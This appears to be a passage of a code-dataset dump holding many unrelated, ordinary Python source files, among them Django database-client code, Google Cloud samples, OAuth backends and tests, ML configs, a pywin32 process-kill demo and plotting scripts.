        sslkey = options.get(""sslkey"")

        if not dbname and not service:
            # Connect to the default 'postgres' db.
            dbname = ""postgres""
        if user:
            args += [""-U"", user]
        if host:
            args += [""-h"", host]
        if port:
            args += [""-p"", str(port)]
        if dbname:
            args += [dbname]
        args.extend(parameters)

        env = {}
        if passwd:
            env[""PGPASSWORD""] = str(passwd)
        if service:
            env[""PGSERVICE""] = str(service)
        if sslmode:
            env[""PGSSLMODE""] = str(sslmode)
        if sslrootcert:
            env[""PGSSLROOTCERT""] = str(sslrootcert)
        if sslcert:
            env[""PGSSLCERT""] = str(sslcert)
        if sslkey:
            env[""PGSSLKEY""] = str(sslkey)
        if passfile:
            env[""PGPASSFILE""] = str(passfile)
        return args, (env or None)

    def runshell(self, parameters):
        sigint_handler = signal.getsignal(signal.SIGINT)
        try:
            # Allow SIGINT to pass to psql to abort queries.
            signal.signal(signal.SIGINT, signal.SIG_IGN)
            super().runshell(parameters)
        finally:
            # Restore the original SIGINT handler.
            signal.signal(signal.SIGINT, sigint_handler)"
JD313	JD313-main_test.py	"# Copyright 2019 Google, LLC.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# NOTE:
# These tests are unit tests that mock Pub/Sub.
import base64
import json
import uuid

import mock
import pytest

import main


@pytest.fixture
def client():
    main.app.testing = True
    return main.app.test_client()


def test_empty_payload(client):
    r = client.post(""/"", json="""")
    assert r.status_code == 400


def test_invalid_payload(client):
    r = client.post(""/"", json={""nomessage"": ""invalid""})
    assert r.status_code == 400


def test_invalid_mimetype(client):
    r = client.post(""/"", json=""{ message: true }"")
    assert r.status_code == 400


@mock.patch(""image.blur_offensive_images"", mock.MagicMock(return_value=204))
def test_minimally_valid_message(client):
    data_json = json.dumps({""name"": True, ""bucket"": True})
    data = base64.b64encode(data_json.encode()).decode()

    r = client.post(""/"", json={""message"": {""data"": data}})
    assert r.status_code == 204


def test_call_to_blur_image(client, capsys):
    filename = str(uuid.uuid4())
    blur_bucket = ""blurred-bucket-"" + str(uuid.uuid4())

    data_json = json.dumps({""name"": filename, ""bucket"": blur_bucket})
    data = base64.b64encode(data_json.encode()).decode()

    r = client.post(""/"", json={""message"": {""data"": data}})
    assert r.status_code == 204

    out, _ = capsys.readouterr()
    assert f""The image {filename} was detected as OK"" in out"
JY468	JY468-display.py	"""""""
Unopinionated display configuration.
""""""

from __future__ import annotations

import locale
import sys

from pandas._config import config as cf

# -----------------------------------------------------------------------------
# Global formatting options
_initial_defencoding: str | None = None


def detect_console_encoding() -> str:
    """"""
    Try to find the most capable encoding supported by the console.
    slightly modified from the way IPython handles the same issue.
    """"""
    global _initial_defencoding

    encoding = None
    try:
        encoding = sys.stdout.encoding or sys.stdin.encoding
    except (AttributeError, OSError):
        pass

    # try again for something better
    if not encoding or ""ascii"" in encoding.lower():
        try:
            encoding = locale.getpreferredencoding()
        except locale.Error:
            # can be raised by locale.setlocale(), which is
            #  called by getpreferredencoding
            #  (on some systems, see stdlib locale docs)
            pass

    # when all else fails. this will usually be ""ascii""
    if not encoding or ""ascii"" in encoding.lower():
        encoding = sys.getdefaultencoding()

    # GH#3360, save the reported defencoding at import time
    # MPL backends may change it. Make available for debugging.
    if not _initial_defencoding:
        _initial_defencoding = sys.getdefaultencoding()

    return encoding


pc_encoding_doc = """"""
: str/unicode
    Defaults to the detected encoding of the console.
    Specifies the encoding to be used for strings returned by to_string,
    these are generally strings meant to be displayed on the console.
""""""

with cf.config_prefix(""display""):
    cf.register_option(
        ""encoding"", detect_console_encoding(), pc_encoding_doc, validator=cf.is_text
    )"
JD220	JD220-selection_prefs.py	"from pip._internal.utils.typing import MYPY_CHECK_RUNNING

if MYPY_CHECK_RUNNING:
    from typing import Optional
    from pip._internal.models.format_control import FormatControl


class SelectionPreferences(object):
    """"""
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """"""

    __slots__ = ['allow_yanked', 'allow_all_prereleases', 'format_control',
                 'prefer_binary', 'ignore_requires_python']

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked,  # type: bool
        allow_all_prereleases=False,  # type: bool
        format_control=None,          # type: Optional[FormatControl]
        prefer_binary=False,          # type: bool
        ignore_requires_python=None,  # type: Optional[bool]
    ):
        # type: (...) -> None
        """"""Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            ""Requires-Python"" values in links. Defaults to False.
        """"""
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python"
JD343	JD343-test_gitea.py	"import json

from .oauth import OAuth2Test


class GiteaOAuth2Test(OAuth2Test):
    backend_path = 'social_core.backends.gitea.GiteaOAuth2'
    user_data_url = 'https://gitea.com/api/v1/user'
    expected_username = 'foobar'
    access_token_body = json.dumps({
        'access_token': 'foobar',
        'token_type': 'bearer',
        'expires_in': 7200,
        'refresh_token': 'barfoo'
    })
    user_data_body = json.dumps({
        'id': 123456,
        'login': 'foobar',
        'full_name': 'Foo Bar',
        'email': 'foobar@example.com',
        'avatar_url': 'https://gitea.com/user/avatar/foobar/-1',
        'language': 'en-US',
        'is_admin': False,
        'last_login': '2016-12-28T12:26:19+01:00',
        'created': '2016-12-28T12:26:19+01:00',
        'restricted': False,
        'username': 'foobar'
    })

    def test_login(self):
        self.do_login()

    def test_partial_pipeline(self):
        self.do_partial_pipeline()


class GiteaCustomDomainOAuth2Test(OAuth2Test):
    backend_path = 'social_core.backends.gitea.GiteaOAuth2'
    user_data_url = 'https://example.com/api/v1/user'
    expected_username = 'foobar'
    access_token_body = json.dumps({
        'access_token': 'foobar',
        'token_type': 'bearer',
        'expires_in': 7200,
        'refresh_token': 'barfoo'
    })
    user_data_body = json.dumps({
        'id': 123456,
        'login': 'foobar',
        'full_name': 'Foo Bar',
        'email': 'foobar@example.com',
        'avatar_url': 'https://example.com/user/avatar/foobar/-1',
        'language': 'en-US',
        'is_admin': False,
        'last_login': '2016-12-28T12:26:19+01:00',
        'created': '2016-12-28T12:26:19+01:00',
        'restricted': False,
        'username': 'foobar'
    })

    def test_login(self):
        self.strategy.set_settings({
            'SOCIAL_AUTH_GITEA_API_URL': 'https://example.com'
        })
        self.do_login()

    def test_partial_pipeline(self):
        self.strategy.set_settings({
            'SOCIAL_AUTH_GITEA_API_URL': 'https://example.com'
        })
        self.do_partial_pipeline()"
JY32	JY32-solov2_r50_fpn_1x_coco.py	"_base_ = [
    '../_base_/datasets/coco_instance.py',
    '../_base_/schedules/schedule_1x.py', '../_base_/default_runtime.py'
]

# model settings
model = dict(
    type='SOLOv2',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=4,
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50'),
        style='pytorch'),
    neck=dict(
        type='FPN',
        in_channels=[256, 512, 1024, 2048],
        out_channels=256,
        start_level=0,
        num_outs=5),
    mask_head=dict(
        type='SOLOV2Head',
        num_classes=80,
        in_channels=256,
        feat_channels=512,
        stacked_convs=4,
        strides=[8, 8, 16, 32, 32],
        scale_ranges=((1, 96), (48, 192), (96, 384), (192, 768), (384, 2048)),
        pos_scale=0.2,
        num_grids=[40, 36, 24, 16, 12],
        cls_down_index=0,
        mask_feature_head=dict(
            feat_channels=128,
            start_level=0,
            end_level=3,
            out_channels=256,
            mask_stride=4,
            norm_cfg=dict(type='GN', num_groups=32, requires_grad=True)),
        loss_mask=dict(type='DiceLoss', use_sigmoid=True, loss_weight=3.0),
        loss_cls=dict(
            type='FocalLoss',
            use_sigmoid=True,
            gamma=2.0,
            alpha=0.25,
            loss_weight=1.0)),
    # model training and testing settings
    test_cfg=dict(
        nms_pre=500,
        score_thr=0.1,
        mask_thr=0.5,
        filter_thr=0.05,
        kernel='gaussian',  # gaussian/linear
        sigma=2.0,
        max_per_img=100))

# optimizer
optimizer = dict(type='SGD', lr=0.01, momentum=0.9, weight_decay=0.0001)
optimizer_config = dict(
    _delete_=True, grad_clip=dict(max_norm=35, norm_type=2))"
JY187	JY187-killProcName.py	"# Kills a process by process name
#
# Uses the Performance Data Helper to locate the PID, then kills it.
# Will only kill the process if there is only one process of that name
# (eg, attempting to kill ""Python.exe"" will only work if there is only
# one Python.exe running.  (Note that the current process does not
# count - ie, if Python.exe is hosting this script, you can still kill
# another Python.exe (as long as there is only one other Python.exe)

# Really just a demo for the win32pdh(util) module, which allows you
# to get all sorts of information about a running process and many
# other aspects of your system.

import win32api, win32pdhutil, win32con, sys


def killProcName(procname):
    # Change suggested by Dan Knierim, who found that this performed a
    # ""refresh"", allowing us to kill processes created since this was run
    # for the first time.
    try:
        win32pdhutil.GetPerformanceAttributes(""Process"", ""ID Process"", procname)
    except:
        pass

    pids = win32pdhutil.FindPerformanceAttributesByName(procname)

    # If _my_ pid in there, remove it!
    try:
        pids.remove(win32api.GetCurrentProcessId())
    except ValueError:
        pass

    if len(pids) == 0:
        result = ""Can't find %s"" % procname
    elif len(pids) > 1:
        result = ""Found too many %s's - pids=`%s`"" % (procname, pids)
    else:
        handle = win32api.OpenProcess(win32con.PROCESS_TERMINATE, 0, pids[0])
        win32api.TerminateProcess(handle, 0)
        win32api.CloseHandle(handle)
        result = """"

    return result


if __name__ == ""__main__"":
    if len(sys.argv) > 1:
        for procname in sys.argv[1:]:
            result = killProcName(procname)
            if result:
                print(result)
                print(""Dumping all processes..."")
                win32pdhutil.ShowAllProcesses()
            else:
                print(""Killed %s"" % procname)
    else:
        print(""Usage: killProcName.py procname ..."")"
JD211	JD211-extraction_data.py	"# 찾아야할 데이터 --> 상품명, 규격, 가격, 상품정보(속성)
import os
import requests
import json
from extraction_sheet_data.get_sheet_range.excel_parsing import sheet_extraction
from extraction_sheet_data.get_sheet_range.monkey_patch import monkey_patch_openpyxl
from extraction_sheet_data.extraction_sheet_data import valid_cell_extraction
from extraction_product_data.extraction_product_data import get_product_data

# 엑셀 파일들이 들어있는 디렉토리의 이름 / 경로
EXCELS_DIR_NAME = 'excel_files'

EXCELS_DIR_PATH = f""{os.getcwd()}/product_data/{EXCELS_DIR_NAME}/""

excel_files_list = os.listdir(EXCELS_DIR_PATH)

excel_files_list.remove('.DS_Store')

headers = {
        'Content-type': 'application/json',
        'Accept' : 'text/html',
        'charset': 'UTF-8'
}

url = 'http://127.0.0.1:8000/products/'

body = {
        'name': '',
        'attribute': '',
        'brand': '',
        'price': 0,
        'code_number': ''
        }


if __name__ == ""__main__"":

        monkey_patch_openpyxl()
        # 다운로드한 엑셀파일에 있는 데이터 접근 --> 각 시트들을 파싱한 객체와 해당 시트의 범위에 대한 정보, 메인 브랜드이름 리턴

        excels_data = sheet_extraction(excel_files_list, EXCELS_DIR_PATH)

        # 각 시트마다 데이터 추출을 시작할 셀 위치와 해당 시트의 특성을 담은(브랜드, 마지막행숫자) 리스트 반환
        sheets_data = valid_cell_extraction(excels_data)
        for i in sheets_data:
                print(i)
        # parse_sheets_data를 기반으로 공산품 데이터 파싱
        products_data = get_product_data(sheets_data)
        for i in products_data:
                for j in i:
                        for key, value in j.items():
                                body[key] = value
                        response = requests.post(url, data=json.dumps(body), headers=headers)
                        print(response.status_code)
                        body[""code_number""] = ''

"
JD221	JD221-initialise.py	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import atexit
import contextlib
import sys

from .ansitowin32 import AnsiToWin32


orig_stdout = None
orig_stderr = None

wrapped_stdout = None
wrapped_stderr = None

atexit_done = False


def reset_all():
    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):

    if not wrap and any([autoreset, convert, strip]):
        raise ValueError('wrap=False conflicts with any other arg=True')

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = \
            wrap_stream(orig_stdout, convert, strip, autoreset, wrap)
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = \
            wrap_stream(orig_stderr, convert, strip, autoreset, wrap)

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr


@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream,
            convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream"
JD314	JD314-main_test.py	"# Copyright 2022 Google LLC.
#
# Licensed under the Apache License, Version 2.0 (the 'License');
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an 'AS IS' BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import subprocess

import pytest

import main


def test_main(capsys):
    main.main()
    out, _ = capsys.readouterr()
    expected = ""Completed Task #0.""
    assert expected in out


def test_env_vars():
    with pytest.raises(Exception, match=r"".*failed.*""):
        main.main(fail_rate=""0.999999"")


def test_bad_env_vars(capsys):
    main.main(fail_rate=""2"")  # Does not fail, so retry is not triggered
    out, _ = capsys.readouterr()
    assert ""Invalid FAIL_RATE env var value"" in out


def test_run_script_success():
    output = (
        subprocess.run(
            [""python3"", ""main.py""],
            stdout=subprocess.PIPE,
            check=True,
        )
        .stdout.strip()
        .decode()
    )

    assert ""Task #0, Attempt"" in output
    assert ""Completed"" in output


def test_run_script_failure(capsys):
    my_env = {""FAIL_RATE"": ""0.99999999""}

    try:
        subprocess.run(
            [""python3"", ""main.py""],
            env=my_env,
            stdout=subprocess.PIPE,
            check=True,
        )
        raise Exception(""Expected CalledProcessError to occur."")
    except subprocess.CalledProcessError as e:
        out = str(e.stdout)
        assert ""Task #0, Attempt"" in out
        assert ""failed"" in out"
JD16	JD16-ipv4-bbmd-server.py	"""""""
Simple IPv4 BBMD server that does _not_ have a network layer or application
layer.
""""""

from __future__ import annotations

import asyncio

from typing import Callable

from bacpypes3.settings import settings
from bacpypes3.debugging import bacpypes_debugging, ModuleLogger
from bacpypes3.argparse import ArgumentParser

from bacpypes3.pdu import IPv4Address, PDU
from bacpypes3.comm import Client, bind

from bacpypes3.ipv4.service import UDPMultiplexer, BIPBBMD
from bacpypes3.ipv4.bvll import BVLLCodec
from bacpypes3.ipv4 import IPv4DatagramServer


# some debugging
_debug = 0
_log = ModuleLogger(globals())


def main() -> None:
    try:
        loop = server = None
        parser = ArgumentParser()
        parser.add_argument(
            ""address"",
            type=str,
            help=""listening address"",
        )
        parser.add_argument(
            ""peers"",
            type=str,
            nargs=""*"",
            help=""peer addresses"",
        )

        args = parser.parse_args()
        if _debug:
            _log.debug(""settings: %r"", settings)

        # get the event loop
        loop = asyncio.get_event_loop()

        # evaluate the address
        address = IPv4Address(args.address)
        if _debug:
            _log.debug(""address: %r"", address)

        # build a very small stack
        bbmd = BIPBBMD(address)
        for peer in args.peers:
            peer_address = IPv4Address(peer)
            bbmd.add_peer(peer_address)

        codec = BVLLCodec()
        multiplexer = UDPMultiplexer()
        server = IPv4DatagramServer(loop, address)

        bind(bbmd, codec, multiplexer.annexJ)
        bind(multiplexer, server)

        # run a really long time
        loop.run_forever()

    except KeyboardInterrupt:
        if _debug:
            _log.debug(""keyboard interrupt"")
    finally:
        if server:
            server.close()
        if loop:
            loop.close()


if __name__ == ""__main__"":
    main()"
JD319	JD319-disable_secret_version.py	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for disabling a secret version.
""""""

import argparse


# [START secretmanager_disable_secret_version]
def disable_secret_version(project_id, secret_id, version_id):
    """"""
    Disable the given secret version. Future requests will throw an error until
    the secret version is enabled. Other secrets versions are unaffected.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret version
    name = f""projects/{project_id}/secrets/{secret_id}/versions/{version_id}""

    # Disable the secret version.
    response = client.disable_secret_version(request={""name"": name})

    print(""Disabled secret version: {}"".format(response.name))
    # [END secretmanager_disable_secret_version]

    return response


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret_id"", help=""id of the secret from which to act"")
    parser.add_argument(""version_id"", help=""id of the version to disable"")
    args = parser.parse_args()

    disable_secret_version(args.project_id, args.secret_id, args.version_id)"
JY39	JY39-mask_rcnn_r50_fpn_1x_cityscapes.py	"_base_ = [
    '../_base_/models/mask_rcnn_r50_fpn.py',
    '../_base_/datasets/cityscapes_instance.py', '../_base_/default_runtime.py'
]
model = dict(
    backbone=dict(init_cfg=None),
    roi_head=dict(
        bbox_head=dict(
            type='Shared2FCBBoxHead',
            in_channels=256,
            fc_out_channels=1024,
            roi_feat_size=7,
            num_classes=8,
            bbox_coder=dict(
                type='DeltaXYWHBBoxCoder',
                target_means=[0., 0., 0., 0.],
                target_stds=[0.1, 0.1, 0.2, 0.2]),
            reg_class_agnostic=False,
            loss_cls=dict(
                type='CrossEntropyLoss', use_sigmoid=False, loss_weight=1.0),
            loss_bbox=dict(type='SmoothL1Loss', beta=1.0, loss_weight=1.0)),
        mask_head=dict(
            type='FCNMaskHead',
            num_convs=4,
            in_channels=256,
            conv_out_channels=256,
            num_classes=8,
            loss_mask=dict(
                type='CrossEntropyLoss', use_mask=True, loss_weight=1.0))))
# optimizer
# lr is set for a batch size of 8
optimizer = dict(type='SGD', lr=0.01, momentum=0.9, weight_decay=0.0001)
optimizer_config = dict(grad_clip=None)
# learning policy
lr_config = dict(
    policy='step',
    warmup='linear',
    warmup_iters=500,
    warmup_ratio=0.001,
    # [7] yields higher performance than [6]
    step=[7])
runner = dict(
    type='EpochBasedRunner', max_epochs=8)  # actual epoch = 8 * 8 = 64
log_config = dict(interval=100)
# For better, more stable performance initialize from COCO
load_from = 'https://download.openmmlab.com/mmdetection/v2.0/mask_rcnn/mask_rcnn_r50_fpn_1x_coco/mask_rcnn_r50_fpn_1x_coco_20200205-d4b0c5d6.pth'  # noqa

# NOTE: `auto_scale_lr` is for automatically scaling LR,
# USER SHOULD NOT CHANGE ITS VALUES.
# base_batch_size = (8 GPUs) x (1 samples per GPU)
auto_scale_lr = dict(base_batch_size=8)"
JD5	JD5-test_transformer.py	"import argparse
import unittest
from typing import Any, Dict, Sequence

import torch
from fairseq.models import transformer

from tests.test_roberta import FakeTask


def mk_sample(tok: Sequence[int] = None, batch_size: int = 2) -> Dict[str, Any]:
    if not tok:
        tok = [10, 11, 12, 13, 14, 15, 2]

    batch = torch.stack([torch.tensor(tok, dtype=torch.long)] * batch_size)
    sample = {
        ""net_input"": {
            ""src_tokens"": batch,
            ""prev_output_tokens"": batch,
            ""src_lengths"": torch.tensor(
                [len(tok)] * batch_size, dtype=torch.long, device=batch.device
            ),
        },
        ""target"": batch[:, 1:],
    }
    return sample


def mk_transformer(**extra_args: Any):
    overrides = {
        # Use characteristics dimensions
        ""encoder_embed_dim"": 12,
        ""encoder_ffn_embed_dim"": 14,
        ""decoder_embed_dim"": 12,
        ""decoder_ffn_embed_dim"": 14,
        # Disable dropout so we have comparable tests.
        ""dropout"": 0,
        ""attention_dropout"": 0,
        ""activation_dropout"": 0,
        ""encoder_layerdrop"": 0,
    }
    overrides.update(extra_args)
    # Overrides the defaults from the parser
    args = argparse.Namespace(**overrides)
    transformer.tiny_architecture(args)

    torch.manual_seed(0)
    task = FakeTask(args)
    return transformer.TransformerModel.build_model(args, task)


class TransformerTestCase(unittest.TestCase):
    def test_forward_backward(self):
        model = mk_transformer(encoder_embed_dim=12, decoder_embed_dim=12)
        sample = mk_sample()
        o, _ = model.forward(**sample[""net_input""])
        loss = o.sum()
        loss.backward()

    def test_different_encoder_decoder_embed_dim(self):
        model = mk_transformer(encoder_embed_dim=12, decoder_embed_dim=16)
        sample = mk_sample()
        o, _ = model.forward(**sample[""net_input""])
        loss = o.sum()
        loss.backward()"
JD321	JD321-transcribe_async_file.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""Google Cloud Speech-to-Text sample application using gRPC for async
batch processing.
""""""


# [START speech_transcribe_async]
def transcribe_file(speech_file):
    """"""Transcribe the given audio file asynchronously.""""""
    from google.cloud import speech

    client = speech.SpeechClient()

    # [START speech_python_migration_async_request]
    with open(speech_file, ""rb"") as audio_file:
        content = audio_file.read()

    """"""
     Note that transcription is limited to a 60 seconds audio file.
     Use a GCS file for audio longer than 1 minute.
    """"""
    audio = speech.RecognitionAudio(content=content)

    config = speech.RecognitionConfig(
        encoding=speech.RecognitionConfig.AudioEncoding.LINEAR16,
        sample_rate_hertz=16000,
        language_code=""en-US"",
    )

    # [START speech_python_migration_async_response]

    operation = client.long_running_recognize(config=config, audio=audio)
    # [END speech_python_migration_async_request]

    print(""Waiting for operation to complete..."")
    response = operation.result(timeout=90)

    # Each result is for a consecutive portion of the audio. Iterate through
    # them to get the transcripts for the entire audio file.
    for result in response.results:
        # The first alternative is the most likely one for this portion.
        print(""Transcript: {}"".format(result.alternatives[0].transcript))
        print(""Confidence: {}"".format(result.alternatives[0].confidence))
    # [END speech_python_migration_async_response]


# [END speech_transcribe_async]"
JY556	JY556-Plexi.py	"
from inspect import getsourcefile
import os.path as path, sys
current_dir = path.dirname(path.abspath(getsourcefile(lambda:0)))
sys.path.insert(0, current_dir[:current_dir.rfind(path.sep)])
from AP import *
import matplotlib.pyplot as plt
from matplotlib.ticker import MultipleLocator
from scipy import optimize
import matplotlib.ticker as ticker
import math



Y_LABEL = r""Anzahl Intensitätsmaxima""
X_LABEL = r""Winkel in $^\circ$""
X_START =-5
Y_START =0
X_END = 10.5
Y_END = 300

X_MAJOR_TICK = 2
Y_MAJOR_TICK =50
X_MINOR_TICK = 0.5
Y_MINOR_TICK = 10
SAVE_AS = ""./INT/plots/plexi.pdf""

path_ = ""./INT/INT.xls""

data = getTableFromCells(""A5"",""B60"",path_,""V3"")


data[1] = [np.rad2deg(np.arctan((i-3.60)/28)) for i in data[1]]
data[0] = [-1*(i+230)+303 for i in data[0]]
print(data)
#---------------  fit
h = 19.46e-3
lamb= 632.8e-9
def func(a,n):
    return 2*h/lamb*(1-n-np.cos(np.deg2rad(a))+np.sqrt(np.power(n,2)-np.power(np.sin(np.deg2rad(a)),2)))



popt,perr = optimize.curve_fit(func,data[1],data[0],p0=[1])
print(popt,np.sqrt(np.diag(perr)))
fitDat =genDataFromFunktion(1000,X_START,X_END,popt,func)

fig, ax = plt.subplots()


ax.grid()

#ax.errorbar(data[0],data[1],fmt=""x"",yerr=data[2], ecolor = 'black',elinewidth=0.9,capsize=4,capthick=0.9,label=""Messdaten"")
ax.plot(fitDat[0],fitDat[1],color = ""red"",label=fr""fit mit n={round_err(popt[0],np.sqrt(np.diag(perr))[0])}"" )
ax.scatter(data[1],data[0],s=15,label=""Messdaten"")



ax.set_xlabel(X_LABEL)
ax.set_ylabel(Y_LABEL)
ax.set_xlim(X_START,X_END)
ax.set_ylim(Y_START,Y_END)
ax.legend()


ax.xaxis.set_major_locator(MultipleLocator(X_MAJOR_TICK))
ax.xaxis.set_minor_locator(MultipleLocator(X_MINOR_TICK))
ax.yaxis.set_major_locator(MultipleLocator(Y_MAJOR_TICK))
ax.yaxis.set_minor_locator(MultipleLocator(Y_MINOR_TICK))

plt.savefig(SAVE_AS)
plt.show()"
JD383	JD383-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""funnelarea"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD496	JD496-predict.py	"import os
import json

import torch
from PIL import Image
from torchvision import transforms
import matplotlib.pyplot as plt

from model import vgg


def main():
    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")

    data_transform = transforms.Compose(
        [transforms.Resize((224, 224)),
         transforms.ToTensor(),
         transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))])

    # load image
    img_path = ""../tulip.jpg""
    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)
    img = Image.open(img_path)
    plt.imshow(img)
    # [N, C, H, W]
    img = data_transform(img)
    # expand batch dimension
    img = torch.unsqueeze(img, dim=0)

    # read class_indict
    json_path = './class_indices.json'
    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)

    with open(json_path, ""r"") as f:
        class_indict = json.load(f)
    
    # create model
    model = vgg(model_name=""vgg16"", num_classes=5).to(device)
    # load model weights
    weights_path = ""./vgg16Net.pth""
    assert os.path.exists(weights_path), ""file: '{}' dose not exist."".format(weights_path)
    model.load_state_dict(torch.load(weights_path, map_location=device))

    model.eval()
    with torch.no_grad():
        # predict class
        output = torch.squeeze(model(img.to(device))).cpu()
        predict = torch.softmax(output, dim=0)
        predict_cla = torch.argmax(predict).numpy()

    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],
                                                 predict[predict_cla].numpy())
    plt.title(print_res)
    for i in range(len(predict)):
        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],
                                                  predict[i].numpy()))
    plt.show()


if __name__ == '__main__':
    main()"
JD339	JD339-kakao.py	"""""""
Kakao OAuth2 backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/kakao.html
""""""
from .oauth import BaseOAuth2


class KakaoOAuth2(BaseOAuth2):
    """"""Kakao OAuth authentication backend""""""
    name = 'kakao'
    AUTHORIZATION_URL = 'https://kauth.kakao.com/oauth/authorize'
    ACCESS_TOKEN_URL = 'https://kauth.kakao.com/oauth/token'
    ACCESS_TOKEN_METHOD = 'POST'
    REDIRECT_STATE = False
    EXTRA_DATA = [
        ('properties', 'properties'),
    ]

    def get_user_id(self, details, response):
        return response['id']

    def get_user_details(self, response):
        """"""Return user details from Kakao account""""""

        kakao_account = response.get('kakao_account', '')
        kaccount_email = kakao_account.get('email', '')
        properties = response.get('properties', '')
        nickname = properties.get('nickname') if properties else ''
        return {
            'username': nickname,
            'email': kaccount_email,
            'fullname': nickname,
            'first_name': nickname[1:] if nickname else '',
            'last_name': nickname[0] if nickname else '',
        }

    def user_data(self, access_token, *args, **kwargs):
        """"""Loads user data from service""""""
        return self.get_json(
            'https://kapi.kakao.com/v2/user/me',
            headers={
                'Authorization': f'Bearer {access_token}',
                'Content_Type': 'application/x-www-form-urlencoded;charset=utf-8',
            },
            params={'access_token': access_token}
        )

    def auth_complete_params(self, state=None):
        client_id, client_secret = self.get_key_and_secret()
        return {
